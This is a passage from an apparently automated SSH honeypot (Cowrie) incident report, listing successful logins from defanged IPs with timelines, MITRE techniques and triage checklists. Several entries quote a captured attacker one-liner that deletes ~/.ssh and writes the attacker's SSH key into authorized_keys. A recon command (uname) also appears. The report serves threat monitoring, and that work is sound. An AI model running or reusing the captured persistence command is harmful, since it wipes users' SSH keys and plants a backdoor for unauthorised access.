| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 17:15:44` | `cowrie.session.connect` |
| `2026-07-06 17:15:44` | `cowrie.client.version` |
| `2026-07-06 17:15:44` | `cowrie.client.kex` |
| `2026-07-06 17:15:45` | `cowrie.login.success` |
| `2026-07-06 17:15:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.154.234[.]9` to AbuseIPDB if not already reported
- [ ] Block `212.154.234[.]9` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e412bcfd7e2

| Field | Detail |
|---|---|
| **Source IP** | `212.154.234[.]9` |
| **First Seen** | 2026-07-06 17:15 |
| **Last Seen** | 2026-07-06 17:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 17:15:45` | `cowrie.session.connect` |
| `2026-07-06 17:15:45` | `cowrie.client.version` |
| `2026-07-06 17:15:46` | `cowrie.client.kex` |
| `2026-07-06 17:15:46` | `cowrie.login.success` |
| `2026-07-06 17:15:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.154.234[.]9` to AbuseIPDB if not already reported
- [ ] Block `212.154.234[.]9` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28471d18c975

| Field | Detail |
|---|---|
| **Source IP** | `124.221.185[.]179` |
| **First Seen** | 2026-07-06 17:15 |
| **Last Seen** | 2026-07-06 17:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 17:15:50` | `cowrie.session.connect` |
| `2026-07-06 17:15:50` | `cowrie.client.version` |
| `2026-07-06 17:15:50` | `cowrie.client.kex` |
| `2026-07-06 17:15:50` | `cowrie.login.success` |
| `2026-07-06 17:15:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.221.185[.]179` to AbuseIPDB if not already reported
- [ ] Block `124.221.185[.]179` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe094864f55f

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-07-06 17:15 |
| **Last Seen** | 2026-07-06 17:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 17:15:51` | `cowrie.session.connect` |
| `2026-07-06 17:15:51` | `cowrie.client.version` |
| `2026-07-06 17:15:51` | `cowrie.client.kex` |
| `2026-07-06 17:15:51` | `cowrie.login.success` |
| `2026-07-06 17:15:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc70f1f0ed4f

| Field | Detail |
|---|---|
| **Source IP** | `200.141.47[.]190` |
| **First Seen** | 2026-07-06 17:21 |
| **Last Seen** | 2026-07-06 17:21 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 17:21:28` | `cowrie.session.connect` |
| `2026-07-06 17:21:28` | `cowrie.client.version` |
| `2026-07-06 17:21:28` | `cowrie.client.kex` |
| `2026-07-06 17:21:28` | `cowrie.login.success` |
| `2026-07-06 17:21:29` | `cowrie.session.params` |
| `2026-07-06 17:21:29` | `cowrie.command.input` |
| `2026-07-06 17:21:29` | `cowrie.command.failed` |
| `2026-07-06 17:21:29` | `cowrie.log.closed` |
| `2026-07-06 17:21:30` | `cowrie.session.params` |
| `2026-07-06 17:21:30` | `cowrie.command.input` |
| `2026-07-06 17:21:30` | `cowrie.session.file_download` |
| `2026-07-06 17:21:30` | `cowrie.log.closed` |
| `2026-07-06 17:21:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.141.47[.]190` to AbuseIPDB if not already reported
- [ ] Block `200.141.47[.]190` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3dedaddbd2e0

| Field | Detail |
|---|---|
| **Source IP** | `200.141.47[.]190` |
| **First Seen** | 2026-07-06 17:21 |
| **Last Seen** | 2026-07-06 17:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 17:21:30` | `cowrie.session.connect` |
| `2026-07-06 17:21:30` | `cowrie.client.version` |
| `2026-07-06 17:21:30` | `cowrie.client.kex` |
| `2026-07-06 17:21:31` | `cowrie.login.success` |
| `2026-07-06 17:21:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.141.47[.]190` to AbuseIPDB if not already reported
- [ ] Block `200.141.47[.]190` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db9ccf5a5f39

| Field | Detail |
|---|---|
| **Source IP** | `200.141.47[.]190` |
| **First Seen** | 2026-07-06 17:21 |
| **Last Seen** | 2026-07-06 17:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 17:21:31` | `cowrie.session.connect` |
| `2026-07-06 17:21:31` | `cowrie.client.version` |
| `2026-07-06 17:21:31` | `cowrie.client.kex` |
| `2026-07-06 17:21:31` | `cowrie.login.success` |
| `2026-07-06 17:21:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.141.47[.]190` to AbuseIPDB if not already reported
- [ ] Block `200.141.47[.]190` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ab3a4175ed5

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-06 17:22 |
| **Last Seen** | 2026-07-06 17:22 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 17:22:22` | `cowrie.session.connect` |
| `2026-07-06 17:22:24` | `cowrie.client.version` |
| `2026-07-06 17:22:24` | `cowrie.client.kex` |
| `2026-07-06 17:22:30` | `cowrie.login.success` |
| `2026-07-06 17:22:34` | `cowrie.session.params` |
| `2026-07-06 17:22:34` | `cowrie.command.input` |
| `2026-07-06 17:22:35` | `cowrie.log.closed` |
| `2026-07-06 17:22:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15ab0c9dc818

| Field | Detail |
|---|---|
| **Source IP** | `182.93.7[.]194` |
| **First Seen** | 2026-07-06 17:24 |
| **Last Seen** | 2026-07-06 17:24 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 17:24:27` | `cowrie.session.connect` |
| `2026-07-06 17:24:27` | `cowrie.client.version` |
| `2026-07-06 17:24:27` | `cowrie.client.kex` |
| `2026-07-06 17:24:28` | `cowrie.login.success` |
| `2026-07-06 17:24:29` | `cowrie.session.params` |
| `2026-07-06 17:24:29` | `cowrie.command.input` |
| `2026-07-06 17:24:29` | `cowrie.command.failed` |
| `2026-07-06 17:24:29` | `cowrie.log.closed` |
| `2026-07-06 17:24:31` | `cowrie.session.params` |
| `2026-07-06 17:24:31` | `cowrie.command.input` |
| `2026-07-06 17:24:31` | `cowrie.session.file_download` |
| `2026-07-06 17:24:31` | `cowrie.log.closed` |
| `2026-07-06 17:24:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.93.7[.]194` to AbuseIPDB if not already reported
- [ ] Block `182.93.7[.]194` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00ef9068048a

| Field | Detail |
|---|---|
| **Source IP** | `182.93.7[.]194` |
| **First Seen** | 2026-07-06 17:24 |
| **Last Seen** | 2026-07-06 17:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 17:24:31` | `cowrie.session.connect` |
| `2026-07-06 17:24:31` | `cowrie.client.version` |
| `2026-07-06 17:24:31` | `cowrie.client.kex` |
| `2026-07-06 17:24:32` | `cowrie.login.success` |
| `2026-07-06 17:24:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.93.7[.]194` to AbuseIPDB if not already reported
- [ ] Block `182.93.7[.]194` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16204ddec387

| Field | Detail |
|---|---|
| **Source IP** | `182.93.7[.]194` |
| **First Seen** | 2026-07-06 17:24 |
| **Last Seen** | 2026-07-06 17:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 17:24:33` | `cowrie.session.connect` |
| `2026-07-06 17:24:33` | `cowrie.client.version` |
| `2026-07-06 17:24:33` | `cowrie.client.kex` |
| `2026-07-06 17:24:34` | `cowrie.login.success` |
| `2026-07-06 17:24:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.93.7[.]194` to AbuseIPDB if not already reported
- [ ] Block `182.93.7[.]194` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2336ad836af8

| Field | Detail |
|---|---|
| **Source IP** | `153.0.158[.]120` |
| **First Seen** | 2026-07-06 17:28 |
| **Last Seen** | 2026-07-06 17:28 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 17:28:42` | `cowrie.session.connect` |
| `2026-07-06 17:28:42` | `cowrie.client.version` |
| `2026-07-06 17:28:43` | `cowrie.client.kex` |
| `2026-07-06 17:28:44` | `cowrie.login.success` |
| `2026-07-06 17:28:45` | `cowrie.session.params` |
| `2026-07-06 17:28:45` | `cowrie.command.input` |
| `2026-07-06 17:28:45` | `cowrie.command.failed` |
| `2026-07-06 17:28:46` | `cowrie.log.closed` |
| `2026-07-06 17:28:46` | `cowrie.session.params` |
| `2026-07-06 17:28:46` | `cowrie.command.input` |
| `2026-07-06 17:28:47` | `cowrie.session.file_download` |
| `2026-07-06 17:28:47` | `cowrie.log.closed` |
| `2026-07-06 17:28:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `153.0.158[.]120` to AbuseIPDB if not already reported
- [ ] Block `153.0.158[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9dfffef60a73

| Field | Detail |
|---|---|
| **Source IP** | `153.0.158[.]120` |
| **First Seen** | 2026-07-06 17:28 |
| **Last Seen** | 2026-07-06 17:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 17:28:47` | `cowrie.session.connect` |
| `2026-07-06 17:28:47` | `cowrie.client.version` |
| `2026-07-06 17:28:47` | `cowrie.client.kex` |
| `2026-07-06 17:28:48` | `cowrie.login.success` |
| `2026-07-06 17:28:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `153.0.158[.]120` to AbuseIPDB if not already reported
- [ ] Block `153.0.158[.]120` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fcda68cb4e15

| Field | Detail |
|---|---|
| **Source IP** | `153.0.158[.]120` |
| **First Seen** | 2026-07-06 17:28 |
| **Last Seen** | 2026-07-06 17:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 17:28:49` | `cowrie.session.connect` |
| `2026-07-06 17:28:49` | `cowrie.client.version` |
| `2026-07-06 17:28:49` | `cowrie.client.kex` |
| `2026-07-06 17:28:50` | `cowrie.login.success` |
| `2026-07-06 17:28:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `153.0.158[.]120` to AbuseIPDB if not already reported
- [ ] Block `153.0.158[.]120` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e833ba33d0ff

| Field | Detail |
|---|---|
| **Source IP** | `139.59.59[.]165` |
| **First Seen** | 2026-07-06 17:29 |
| **Last Seen** | 2026-07-06 17:29 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 17:29:22` | `cowrie.session.connect` |
| `2026-07-06 17:29:22` | `cowrie.client.version` |
| `2026-07-06 17:29:22` | `cowrie.client.kex` |
| `2026-07-06 17:29:23` | `cowrie.login.success` |
| `2026-07-06 17:29:24` | `cowrie.session.params` |
| `2026-07-06 17:29:24` | `cowrie.command.input` |
| `2026-07-06 17:29:24` | `cowrie.command.failed` |
| `2026-07-06 17:29:25` | `cowrie.log.closed` |
| `2026-07-06 17:29:25` | `cowrie.session.params` |
| `2026-07-06 17:29:25` | `cowrie.command.input` |
| `2026-07-06 17:29:26` | `cowrie.session.file_download` |
| `2026-07-06 17:29:26` | `cowrie.log.closed` |
| `2026-07-06 17:29:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.59[.]165` to AbuseIPDB if not already reported
- [ ] Block `139.59.59[.]165` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af6ddaf3f924

| Field | Detail |
|---|---|
| **Source IP** | `139.59.59[.]165` |
| **First Seen** | 2026-07-06 17:29 |
| **Last Seen** | 2026-07-06 17:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 17:29:26` | `cowrie.session.connect` |
| `2026-07-06 17:29:26` | `cowrie.client.version` |
| `2026-07-06 17:29:26` | `cowrie.client.kex` |
| `2026-07-06 17:29:27` | `cowrie.login.success` |
| `2026-07-06 17:29:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.59[.]165` to AbuseIPDB if not already reported
- [ ] Block `139.59.59[.]165` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-13862571714c

| Field | Detail |
|---|---|
| **Source IP** | `139.59.59[.]165` |
| **First Seen** | 2026-07-06 17:29 |
| **Last Seen** | 2026-07-06 17:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 17:29:27` | `cowrie.session.connect` |
| `2026-07-06 17:29:27` | `cowrie.client.version` |
| `2026-07-06 17:29:28` | `cowrie.client.kex` |
| `2026-07-06 17:29:28` | `cowrie.login.success` |
| `2026-07-06 17:29:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.59[.]165` to AbuseIPDB if not already reported
- [ ] Block `139.59.59[.]165` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26c968b1a025

| Field | Detail |
|---|---|
| **Source IP** | `2.58.172[.]185` |
| **First Seen** | 2026-07-06 17:31 |
| **Last Seen** | 2026-07-06 17:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 17:31:05` | `cowrie.session.connect` |
| `2026-07-06 17:31:05` | `cowrie.client.version` |
| `2026-07-06 17:31:05` | `cowrie.client.kex` |
| `2026-07-06 17:31:05` | `cowrie.login.success` |
| `2026-07-06 17:31:06` | `cowrie.session.params` |
| `2026-07-06 17:31:06` | `cowrie.command.input` |
| `2026-07-06 17:31:06` | `cowrie.log.closed` |
| `2026-07-06 17:31:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.58.172[.]185` to AbuseIPDB if not already reported
- [ ] Block `2.58.172[.]185` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77f9f1459c59

| Field | Detail |
|---|---|
| **Source IP** | `197.5.145[.]114` |
| **First Seen** | 2026-07-06 17:32 |
| **Last Seen** | 2026-07-06 17:32 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 17:32:46` | `cowrie.session.connect` |
| `2026-07-06 17:32:46` | `cowrie.client.version` |
| `2026-07-06 17:32:46` | `cowrie.client.kex` |
| `2026-07-06 17:32:46` | `cowrie.login.success` |
| `2026-07-06 17:32:47` | `cowrie.session.params` |
| `2026-07-06 17:32:47` | `cowrie.command.input` |
| `2026-07-06 17:32:47` | `cowrie.command.failed` |
| `2026-07-06 17:32:47` | `cowrie.log.closed` |
| `2026-07-06 17:32:48` | `cowrie.session.params` |
| `2026-07-06 17:32:48` | `cowrie.command.input` |
| `2026-07-06 17:32:48` | `cowrie.session.file_download` |
| `2026-07-06 17:32:48` | `cowrie.log.closed` |
| `2026-07-06 17:32:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.5.145[.]114` to AbuseIPDB if not already reported
- [ ] Block `197.5.145[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d5ad6458711

| Field | Detail |
|---|---|
| **Source IP** | `197.5.145[.]114` |
| **First Seen** | 2026-07-06 17:32 |
| **Last Seen** | 2026-07-06 17:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 17:32:48` | `cowrie.session.connect` |
| `2026-07-06 17:32:48` | `cowrie.client.version` |
| `2026-07-06 17:32:48` | `cowrie.client.kex` |
| `2026-07-06 17:32:49` | `cowrie.login.success` |
| `2026-07-06 17:32:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.5.145[.]114` to AbuseIPDB if not already reported
- [ ] Block `197.5.145[.]114` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f929c4d6b2f3

| Field | Detail |
|---|---|
| **Source IP** | `197.5.145[.]114` |
| **First Seen** | 2026-07-06 17:32 |
| **Last Seen** | 2026-07-06 17:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 17:32:49` | `cowrie.session.connect` |
| `2026-07-06 17:32:49` | `cowrie.client.version` |
| `2026-07-06 17:32:49` | `cowrie.client.kex` |
| `2026-07-06 17:32:50` | `cowrie.login.success` |
| `2026-07-06 17:32:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.5.145[.]114` to AbuseIPDB if not already reported
- [ ] Block `197.5.145[.]114` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5aec5d303200

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-06 17:34 |
| **Last Seen** | 2026-07-06 17:34 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 17:34:37` | `cowrie.session.connect` |
| `2026-07-06 17:34:38` | `cowrie.client.version` |
| `2026-07-06 17:34:38` | `cowrie.client.kex` |
| `2026-07-06 17:34:45` | `cowrie.login.success` |
| `2026-07-06 17:34:48` | `cowrie.session.params` |
| `2026-07-06 17:34:48` | `cowrie.command.input` |
| `2026-07-06 17:34:50` | `cowrie.log.closed` |
| `2026-07-06 17:34:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb0ef87012bc

| Field | Detail |
|---|---|
| **Source IP** | `103.154.62[.]14` |
| **First Seen** | 2026-07-06 17:37 |
| **Last Seen** | 2026-07-06 17:37 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
